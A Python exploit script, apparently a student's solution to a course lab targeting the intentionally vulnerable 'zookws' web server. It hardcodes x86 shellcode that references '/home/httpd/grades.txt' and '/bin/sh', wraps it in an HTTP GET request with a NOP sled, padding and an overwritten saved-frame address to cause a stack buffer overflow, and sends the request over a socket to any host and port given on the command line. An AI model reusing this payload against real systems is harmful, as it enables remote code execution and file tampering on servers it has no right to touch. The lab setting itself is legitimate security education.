#!/usr/bin/python
import sys
import socket
import traceback
import urllib.parse
import struct
#import bytes

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0x34567890
stack_saved_ebp = "%28%EE%FF%BF"
#stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    shellcode="eb33 5e89 7608 31c0 8846 0789 460c b00b 89f3 8d4e 088d 560c cd80 5e31 db89 5e16 89d8 89f3 4040 4040 4040 4040 4040 cd80 31c0 40cd 80e8 e0ff ffff 2f68 6f6d 652f 6874 7470 642f 6772 6164 6573 2e74 7874 e8ad ffff ff2f 6269 6e2f 7368"
    shellcode = bytes.fromhex(shellcode)
    i=0
    print(urllib.parse.quote_from_bytes(shellcode))
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
    C = urllib.parse.quote_from_bytes(shellcode)
    print(len("%90"*256+C+"A"*(2048-len(C)-256)+stack_saved_ebp*16))
    req =   "GET /"+"%90"*255+C+"A"*(2046-256-94)+stack_saved_ebp*16+" HTTP/1.0\r\n" + \
	    "\r\n"
    #req = urllib.parse.quote(req)
    return req.encode()

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	    resp = resp + rbuf.decode()
	    rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    #shellfile = open("shellcode.bin", "r")
    #shellcode = shellfile.read()
    shellcode=""
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

